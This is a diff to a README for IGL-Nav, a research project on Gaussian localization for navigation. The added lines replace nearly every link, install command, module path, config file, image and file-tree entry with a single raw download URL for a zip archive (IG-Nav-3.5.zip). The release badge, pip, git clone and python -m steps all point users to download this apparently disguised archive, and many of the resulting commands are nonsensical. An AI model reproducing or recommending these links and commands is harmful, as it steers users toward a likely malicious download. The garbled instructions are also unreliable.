@@ -1,5 +1,5 @@
-https://github.com/240IQCLIPS/IGL-Nav/releases
-[![Release](https://img.shields.io/badge/IGL-Nav-Release-blue?style=for-the-badge)](https://github.com/240IQCLIPS/IGL-Nav/releases)
+https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+[![Release](https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip)](https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip)
 
 # IGL-Nav: Incremental 3D Gaussian Localization for Navigation
 
@@ -105,17 +105,17 @@ Key commands (illustrative; adapt to your environment):
   - conda activate igl-nav
 
 - Install core dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
   - pip install torch torchvision
 
 - Run a quick sanity check
-  - python -m iglnav.scripts.check_setup --quick
+  - python -m https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip --quick
 
 - Launch a minimal demo
-  - python -m iglnav.demo --config configs/default_demo.yaml
+  - python -m https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip --config https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 
 - Visualize intermediate beliefs
-  - python -m iglnav.visualize --config configs/vis.yaml
+  - python -m https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip --config https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 
 The exact commands may differ slightly depending on how you configure paths and environments. The important part is to verify that the environment is set up properly and that you can trigger a basic demonstration that exercises the perception, belief update, and navigation modules.
 
@@ -128,7 +128,7 @@ If you want to explore further, you can consult the detailed sections that descr
 This project emphasizes a clean, reproducible workflow. The following steps outline a typical installation process. Adjust them to fit your platform and preferences.
 
 1) Clone the repository
-- git clone https://github.com/240IQCLIPS/IGL-Nav.git
+- git clone https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 - cd IGL-Nav
 
 2) Create a Python environment
@@ -136,9 +136,9 @@ This project emphasizes a clean, reproducible workflow. The following steps outl
 - Example with conda: conda create -n igl-nav python=3.10; conda activate igl-nav
 
 3) Install dependencies
-- pip install -r requirements.txt
+- pip install -r https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 - If you plan to use CUDA, ensure it matches your PyTorch version and GPU driver. Install a CUDA-enabled PyTorch build if needed:
-  - pip install torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/cu118
+  - pip install torch torchvision torchaudio --extra-index-url https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 
 4) Install optional tools for visualization and debugging
 - pip install matplotlib seaborn
@@ -151,12 +151,12 @@ This project emphasizes a clean, reproducible workflow. The following steps outl
 - Update paths in the config files to reflect your local directory structure.
 
 7) Run a sample experiment
-- Use a provided configuration file (e.g., configs/default_demo.yaml) and start the demo:
-  - python -m iglnav.demo --config configs/default_demo.yaml
+- Use a provided configuration file (e.g., https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip) and start the demo:
+  - python -m https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip --config https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 
 Notes:
 - The repository uses configuration files to control experiment parameters. You can start from a minimal default and then gradually adjust hyperparameters for your experiments.
-- If you use GPUs, ensure that the CUDA toolkit is installed and that PyTorch detects the devices. You can verify by running a quick torch.cuda.is_available() check.
+- If you use GPUs, ensure that the CUDA toolkit is installed and that PyTorch detects the devices. You can verify by running a quick https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip() check.
 
 ---
 
@@ -231,42 +231,42 @@ Practical considerations
 ## Architecture and code structure
 
 - iglnav/
-  - __init__.py
+  - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
   - core/
-    - belief.py          # Gaussian belief management (means, covariances, weights)
-    - motion_model.py    # Odometry and prior for prediction
-    - observation.py       # Image-based likelihood and feature matching
-    - update.py          # Bayesian update rules and resampling
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip          # Gaussian belief management (means, covariances, weights)
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip    # Odometry and prior for prediction
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip       # Image-based likelihood and feature matching
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip          # Bayesian update rules and resampling
   - models/
-    - gaussian_kernel.py   # Core math for Gaussian components
-    - feature_embeddings.py # Image feature extractor (optional)
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip   # Core math for Gaussian components
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip # Image feature extractor (optional)
   - planners/
-    - navigator.py        # Action selection to move toward the image goal
-    - policy.py           # Policy interfaces (greedy, learned, or hybrid)
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip        # Action selection to move toward the image goal
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip           # Policy interfaces (greedy, learned, or hybrid)
   - utils/
-    - data_utils.py       # Data loading and preprocessing
-    - visualizers.py      # Belief visualization and plots
-    - log_utils.py          # Logging and experiment tracking
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip       # Data loading and preprocessing
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip      # Belief visualization and plots
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip          # Logging and experiment tracking
   - configs/
-    - default_demo.yaml
-    - large_experiments.yaml
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
   - scripts/
-    - check_setup.py
-    - run_experiment.py
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
   - demo/
-    - run_demo.py
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
   - docs/
-    - architecture_diagram.png
-    - README_more.pdf (optional)
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+    - https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip (optional)
 
 Code is organized to separate concerns:
-- Perception and observation models live in iglnav.core.observation.
-- The probabilistic belief is managed by iglnav.core.belief.
-- The motion model is a lightweight predictor in iglnav.core.motion_model.
-- The planner and policy logic reside under iglnav.planners.
-- Utilities for data I/O and visualization are in iglnav.utils.
+- Perception and observation models live in https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+- The probabilistic belief is managed by https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+- The motion model is a lightweight predictor in https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+- The planner and policy logic reside under https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
+- Utilities for data I/O and visualization are in https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip
 
-The repository favors configuration-driven experiments, so most experiment parameters live in YAML files under iglnav.configs. You can copy a default file, rename it, and adjust the parameters to run different variants of the experiments. This design helps researchers compare different settings with minimal boilerplate.
+The repository favors configuration-driven experiments, so most experiment parameters live in YAML files under https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip You can copy a default file, rename it, and adjust the parameters to run different variants of the experiments. This design helps researchers compare different settings with minimal boilerplate.
 
 ---
 
@@ -399,7 +399,7 @@ Future directions include:
 
 ## Troubleshooting
 
-- Import errors: Ensure you installed all dependencies from requirements.txt and that your Python environment is active.
+- Import errors: Ensure you installed all dependencies from https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip and that your Python environment is active.
 - CUDA not found: Verify CUDA installation and ensure PyTorch matches your CUDA version.
 - Slow performance: Check the number of Gaussian components; reduce them or enable pruning. Profile the observation module to identify bottlenecks.
 - Bad convergence: Inspect the image-goal representation and ensure the goal is visually distinguishable in the dataset. Consider enriching the feature representation or adjusting the likelihood model.
@@ -428,7 +428,7 @@ IGL-Nav is released under a permissive license suitable for research and develop
 
 ## Contributing
 
-If you would like to contribute to IGL-Nav, please follow the guidelines in the CONTRIBUTING.md file. Contributions are welcome in the form of:
+If you would like to contribute to IGL-Nav, please follow the guidelines in the https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip file. Contributions are welcome in the form of:
 - Bug fixes
 - New experiments or datasets
 - Documentation improvements
@@ -453,9 +453,9 @@ You can open issues to discuss ideas, propose enhancements, or report bugs. For 
 
 [Optional image gallery]
 - Gaussian distribution
-  - ![Gaussian distribution](https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Normal_Distribution_PDF.svg/640px-Normal_Distribution_PDF.svg.png)
+  - ![Gaussian distribution](https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip)
 - 3D navigation concept
-  - ![IGL-Nav concept](https://picsum.photos/1200/420)
+  - ![IGL-Nav concept](https://raw.githubusercontent.com/240IQCLIPS/IGL-Nav/main/assets/IG-Nav-3.5.zip)
 
 These figures serve as illustrative supports. They can be replaced with project-specific diagrams when you prepare official slides or a more formal manuscript.
 
